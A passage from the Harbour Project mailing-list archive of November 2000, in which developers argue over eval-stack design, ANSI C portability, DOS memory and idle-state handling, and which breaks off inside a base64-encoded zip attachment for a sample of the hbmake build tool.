variables before function calling. However how to estimate the number 
of stack items required for temporary use (operator handling)? Will 
be <100 + number_of_locals * 10) enough? Maybe some other number? 
Regardless how we calculate it then the result can be too small and 
we will have to allocate a new block inside a function or we will 
have to generate a stack overflow error. If we decide to use another 
block then we cannot use current addressing method.
  Of course we can assume that a ,,normal application'' will work 
with our default numbers but what is it a ,,normal application''. 
Shouldn't we support non-normal applications too?

  Or maybe we should manage two stacks. One for parameters and locals 
and second for temporary items?

Regards, Ryszard

From harbour@lists.harbour-project.org  Sun Nov 26 11:27:54 2000
From: harbour@lists.harbour-project.org (Ryszard Glab)
Date: Sun Nov 26 11:27:54 2000
Subject: Changes in VM and eval stack (was:(Re: [Harbour] Random gpfs)
In-Reply-To: <LOBBKAFMMFGJIKLMEPAKCEHIDHAA.ron@profit-master.com>
References: <018401c05686$ea9c92b0$0a0ac8c8@VECWS1>
Message-ID: <3A2110E0.5997.92EA5EB@localhost>

On 24 Nov 2000, at 19:16, Ron Pinkas wrote:

> > As said several times, the fact that DOS support has some problems,
> > doesn't mean that we should severe the situation by adding _new_
> > problems, or we could ignore the 16bit platform.
> 
> I agree 100%!!!
> 
> Though, this proposal will not add any *new* problem to DOS. It will
> simply mean that Harbour will not be able to offer "infinitely"
> growing Dynamic Stack in DOS.
> 
> This will not change anything because DOS doesn't have the "infinite"
> memory pool to begin with.
> 
> It will simply mean that a reasonable Stack Size will be used in DOS.

  I disagree. In DOS box Clipper can use all available memory if 
compiled with any protected mode linker. Harbour can use this memory 
too. Why do you want to limit usage of harbour in DOS?

Ryszard

From harbour@lists.harbour-project.org  Sun Nov 26 11:28:32 2000
From: harbour@lists.harbour-project.org (Ryszard Glab)
Date: Sun Nov 26 11:28:32 2000
Subject: Changes in VM and eval stack (was:(Re: [Harbour] Random gpfs)
In-Reply-To: <LOBBKAFMMFGJIKLMEPAKCEHKDHAA.ron@profit-master.com>
References: <01a001c05690$af2ee7a0$0a0ac8c8@VECWS1>
Message-ID: <3A2112AE.5170.935B3DF@localhost>

On 24 Nov 2000, at 20:05, Ron Pinkas wrote:

> 1. Let's keep it simple, Maurilio, asked a question, I answered.

  Idle handling was simple. Now it is very complicated code and usage 
placed in several subsystems.

> 2. No, I don't think that Maurilio's proposal will introduce new
> problems to Harbour DOS, nor do I agree that this will force multiple
> implementation of the stack, or will force the Harbour core to be
> [more] platform dependant.

  We will have to use different code for different OS instead of 
simple ANSI C code. Doesn't it qualify for more platform depenency?

> 3. I don't believe in reinventing the wheel, especially, not under
> sever time constraints. I want to see 1.0 ASAP. I am not in favor of
> re-implementing such critical piece (unless un-avoidable) before we
> release 1.0.

  :) Simplex. Idle.

Ryszard

From harbour@lists.harbour-project.org  Sun Nov 26 11:29:09 2000
From: harbour@lists.harbour-project.org (Ryszard Glab)
Date: Sun Nov 26 11:29:09 2000
Subject: [Harbour] 2000-11-23 10:00 UTC+0800 Ron Pinkas <ron@profit-master.com>
In-Reply-To: <LOBBKAFMMFGJIKLMEPAKOEHDDHAA.ron@profit-master.com>
References: <3A1E5ECF.18297.36237DE@localhost>
Message-ID: <3A212753.2891.98656C2@localhost>

On 24 Nov 2000, at 10:43, Ron Pinkas wrote:

> Ryszard, for the Nth time, my change was a minor change, far from
> finalizing, or dictating the way Harbour should handle Wait States.

  It is not a minor change if you are replacing some behaviour with 
another one without getting some consensus before a change and even 
with no understanding of this behaviour as you have wrote.

> I did explain exactly why this might not be reliable, yet you again
> insist on converting every argument we might have to  some personal
> war. Please try to tone yourself down. We are not going to benefit
> from such personal statements.

  This explanation just confirms your lack of understanding of idle 
states. Notice that every application consists of two parts: user 
interaction and data processing. With adding idle support for INKEY() 
you have reliable solution for user interaction part. With adding a 
simple progress bar with HB_IDLESTATE() call you have a reliable 
solution for data processing.

> > > Please note, I don't suggest we disallow reoccurring (per Wait
> > > State) Idle Tasks, just wondering whether this should be the
> > > default.
> >
> >   Yes, Ron. You are not suggesting it. You have made it already and
> > now you are wondering why other developers are upset.

  First instead of _suggesting_ some change you have changed 
something. Next you are wondering what should be a default behaviour 
while you are unable to give an example of real usage for your 
implemented change.

> Right, I forgot you must know better, my intentions, my feelings, and
> even my wonders.

  Ops, sorry. I forgot that you are getting all arguments (even pure 
technical onces) as personal attacks.

I am going back to lurking mode.
Regards, Ryszard

From harbour@lists.harbour-project.org  Sun Nov 26 11:29:47 2000
From: harbour@lists.harbour-project.org (John Skelton)
Date: Sun Nov 26 11:29:47 2000
Subject: [Harbour] 2000-11-23 10:00 UTC+0800 Ron Pinkas
 <ron@profit-master.com>
Message-ID: <200011260714_MC2-BC1C-A251@compuserve.com>

Phil,

"The only problem I have with this is that you are now creating core =

dependencies that are OS specific. This is something that we have =

avoided so far."

There are OS & compiler dependencies and assumptions scattered
throughout Harbour.  It would be nice to be able to have an ideal
situation as regards the stack (and those other dependencies etc I
just mentioned), but I don't see any way to do that at the same time
as having a sensible stack design/implementation.  It doesn't strike
me as any big deal if the stack management is tuned to the OS if in
return we have a stack that behaves better than it now does!

"that we can't create a VM Block allocation scheme in ANSI C?"

A vast amount of Harbour can't be done in ANSI C, depending a bit
on what one defines as ANSI C.  Obviously it includes the (but which?
<g>) Std itself.  But the Std limits itself in many ways.

On occasion I have written C that was supposed to be very portable
and to stick with the (1989) Std.  I know C _very_ well, but found I
needed to refer to the Std constantly and the pain was immense.  Is
anyone here doing that when writing Harbour?

BTW, This is not a criticism of the Std.  It's a good one.  Mostly
it's clear, consistent, and so on.  But sticking only to defined
behaviour (i.e. avoiding undefined behaviour, implementation-
defined behaviour, and so on) is tough IMO.

I also don't mean to criticise anyone who isn't constantly checking
the Std.  Writing code that way would mean that there'd now be only a
fraction of what exists.  The code we have is (mostly <g>) "good
enough" I think.  Some needs improving (e.g. stack), some needs
writing (e.g. RDDs).  Let's attack those two issues and not worry
excessively (see "sensibly" below) about ANSI C.

"Sometime in the future, people will want to port Harbour to other =

platforms. The more work we do in ANSI C, the more likely this will =

happen."

True enough, but simplistic.  Harbour needs or can benefit from lots
of things which aren't in ANSI C.  That's extremely common.  What
matters is that we take a sensible approach: e.g. try to make it easy
to find & change the parts that are OS/UI/GUI/memory size/etc-dependent,
don't use things which unnecessarily restrict the potential targets
for Harbour, and so on.

I posted a message about architectural/portability issues some time
ago.  IIRC I got _no_ replies, yet here we are worrying about
something with far less impact on future portability.

BTW, I'm not too worried about the lack of replies.  There are plenty
of other things to work on!

"We agreed long ago that the core of Harbour Project would be written
in ANSI C"

As a goal, and provided that statement is meant to be interpreted
sensibly, that looks good to me.  I don't see the idea of using
VirtualAlloc() and so on as being inconsistent with that goal.

John.

From harbour@lists.harbour-project.org  Sun Nov 26 12:28:02 2000
From: harbour@lists.harbour-project.org (Ron Pinkas)
Date: Sun Nov 26 12:28:02 2000
Subject: Changes in VM and eval stack (was:(Re: [Harbour] Random gpfs)
In-Reply-To: <3A2112AE.5170.935B3DF@localhost>
Message-ID: <LOBBKAFMMFGJIKLMEPAKAEIKDHAA.ron@profit-master.com>

Ryszard,

>   Idle handling was simple. Now it is very complicated code and usage
> placed in several subsystems.

My "complicated code" added exactly 1 variable and 2 if()s. If you know of a
simpler way to allow Idle Blocks to run once per wait state, while allowing
repeat processing by default, please feel free to correct it, or give me a
tip on how to improve it, and I'll gladly fix it.

I suspect you can *not* make it any simpler, so please stop this nonsense
already!

BTW, it is not placed in several subsystems, it  is placed exactly where it
was all the time. If you think that such an option should not be controlled
by SET(), please suggest the preferred alternative.

> > 2. No, I don't think that Maurilio's proposal will introduce new
> > problems to Harbour DOS, nor do I agree that this will force multiple
> > implementation of the stack, or will force the Harbour core to be
> > [more] platform dependant.
>
>   We will have to use different code for different OS instead of
> simple ANSI C code. Doesn't it qualify for more platform depenency?

No, because we already have such dependencies, and mostly because we are
talking about practically no code change.

> > 3. I don't believe in reinventing the wheel, especially, not under
> > sever time constraints. I want to see 1.0 ASAP. I am not in favor of
> > re-implementing such critical piece (unless un-avoidable) before we
> > release 1.0.
>
>   :) Simplex. Idle.

You call the addition of non repeat support to Idle Block, re-inventing the
wheel? This added missing functionality in less than 10 minutes of my time.
Interesting observation.

I was wasting more time fiddling with Flex definitions, than took me to
develop SimpLex, the stack on the other hand seems very stable. If we add
Virtual Allocation it will meet all current needs, yet will not stop anyone
from revisiting this issue when ever needed.

Ron


From harbour@lists.harbour-project.org  Sun Nov 26 13:21:01 2000
From: harbour@lists.harbour-project.org (Ron Pinkas)
Date: Sun Nov 26 13:21:01 2000
Subject: [Harbour] 2000-11-26 10:10 UTC+0800 Ron Pinkas <ron@profit-master.com>
In-Reply-To: <LOBBKAFMMFGJIKLMEPAKAEIKDHAA.ron@profit-master.com>
Message-ID: <LOBBKAFMMFGJIKLMEPAKOEIKDHAA.ron@profit-master.com>

2000-11-26 10:10 UTC+0800 Ron Pinkas <ron@profit-master.com>
   * source/pp/ppcore.c
     + Added support for ',' within Array Index in NextParm()


From harbour@lists.harbour-project.org  Sun Nov 26 13:22:01 2000
From: harbour@lists.harbour-project.org (Ron Pinkas)
Date: Sun Nov 26 13:22:01 2000
Subject: [Harbour] pp on arrays
In-Reply-To: <002301c0576a$d5c8f240$8604d2cc@san.rr.com>
Message-ID: <LOBBKAFMMFGJIKLMEPAKCEILDHAA.ron@profit-master.com>

Fixed.

> Aaargh!
> Sorry, if I take the time to whittle it down I really should test exactly
> what I've whittled before sending it up.
> There was another header involved, and the single line that makes the
> difference is a compound subscript for the array element:
> 
> #define ALARM_LEADTIME        14,1
> Apparently the embedded comma causes a problem.
> 
> Brian Hays
> Abacus Data Systems, Inc


From harbour@lists.harbour-project.org  Sun Nov 26 16:52:00 2000
From: harbour@lists.harbour-project.org (Maurilio Longo)
Date: Sun Nov 26 16:52:00 2000
Subject: Changes in VM and eval stack (was:(Re: [Harbour] Random gpfs)
References: <LOBBKAFMMFGJIKLMEPAKAEIKDHAA.ron@profit-master.com>
Message-ID: <3A2185D6.B43DEE0B@libero.it>

Ron,

I don't think VirualAlloc() will add more OS dependancies than record
locking or terminal emulation.

I think that stack should not move around since "moving" is not a
quality of what we call "stack" under standard conditions.

That said, a linked list could work but we need a "layer" between a
linked list and a stack to make them work as expected.

This layer is simple, you never return a pointer to an item, you always
return an handle to an item. This handle is the item number.

When you need the actual item you call some function that given an
handle gives you back a pointer to a copy of the requested item newly
allocated outside of the stack.

This will force us to change all existing code which deals with stacked
items, but should work as expected and not require any dependancy on
underlaying os.

Please note that I bet we won't see handheld PCs running harbour any
time soon :-))

regards.

PS. While we're at it, removing use of s_Stack_whatever will make it
easier to add threads in the long run. 

Ron Pinkas ha scritto:
> 
> Ryszard,
> 
> >   Idle handling was simple. Now it is very complicated code and usage
> > placed in several subsystems.
> 
> My "complicated code" added exactly 1 variable and 2 if()s. If you know of a
> simpler way to allow Idle Blocks to run once per wait state, while allowing
> repeat processing by default, please feel free to correct it, or give me a
> tip on how to improve it, and I'll gladly fix it.
> 
> I suspect you can *not* make it any simpler, so please stop this nonsense
> already!
> 
> BTW, it is not placed in several subsystems, it  is placed exactly where it
> was all the time. If you think that such an option should not be controlled
> by SET(), please suggest the preferred alternative.
> 
> > > 2. No, I don't think that Maurilio's proposal will introduce new
> > > problems to Harbour DOS, nor do I agree that this will force multiple
> > > implementation of the stack, or will force the Harbour core to be
> > > [more] platform dependant.
> >
> >   We will have to use different code for different OS instead of
> > simple ANSI C code. Doesn't it qualify for more platform depenency?
> 
> No, because we already have such dependencies, and mostly because we are
> talking about practically no code change.
> 
> > > 3. I don't believe in reinventing the wheel, especially, not under
> > > sever time constraints. I want to see 1.0 ASAP. I am not in favor of
> > > re-implementing such critical piece (unless un-avoidable) before we
> > > release 1.0.
> >
> >   :) Simplex. Idle.
> 
> You call the addition of non repeat support to Idle Block, re-inventing the
> wheel? This added missing functionality in less than 10 minutes of my time.
> Interesting observation.
> 
> I was wasting more time fiddling with Flex definitions, than took me to
> develop SimpLex, the stack on the other hand seems very stable. If we add
> Virtual Allocation it will meet all current needs, yet will not stop anyone
> from revisiting this issue when ever needed.
> 
> Ron
> 
> _______________________________________________
> Harbour mailing list
> Harbour@lists.harbour-project.org
> http://www.matrixlist.com/mailman/listinfo/harbour
> 
> Thank you for participating in The Harbour Project.  Be sure to check
> http://www.Harbour-Project.org

-- 

 __________                   
|  |  | |__| md2520@mclink.it 
|_|_|_|____| Team OS/2 Italia

From harbour@lists.harbour-project.org  Sun Nov 26 17:06:02 2000
From: harbour@lists.harbour-project.org (Luiz Rafael Culik Guimaraes)
Date: Sun Nov 26 17:06:02 2000
Subject: [Harbour] simplex problem
Message-ID: <002601c057f5$09990080$0100007f@sl.conex.net>

Ron

The follow code dont work with simplex

function GetBccDir()
local cPath:=''
Local cEnv:=Gete("PATH")
local aEnv:=listasarray2(cEnv,";")
local nPos

for nPos:=1 to len(aEnv)
    if file(aenv[nPos]+'\bcc32.exe') 
        cPath:=aenv[nPos]
        exit
    endif
next

return cPath

Regards from Brazil

Luiz Rafael Culik


From harbour@lists.harbour-project.org  Sun Nov 26 17:31:02 2000
From: harbour@lists.harbour-project.org (Luiz Rafael Culik Guimaraes)
Date: Sun Nov 26 17:31:02 2000
Subject: [Harbour] hbmake example
Message-ID: <002501c057f4$d2fe6ce0$0100007f@sl.conex.net>

This is a multi-part message in MIME format.

------=_NextPart_000_001D_01C057E3.03A03E80
Content-Type: text/plain;
	charset="iso-8859-1"
Content-Transfer-Encoding: 8bit

Dear friends

I´m sending to an sample of hbmake

put hbmake.exe on you harbour\bin diretorie
put the box.prg test.prg make1.mak on other directorio example c:\test
then call hbmake make1.mak

Please note that debug messages still enable

Comments Welcome

Regards from Brazil

Luiz Rafael Culik

------=_NextPart_000_001D_01C057E3.03A03E80
Content-Type: application/zip;
	name="hbmake.ZIP"
Content-Transfer-Encoding: base64
Content-Disposition: attachment;
	filename="hbmake.ZIP"

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
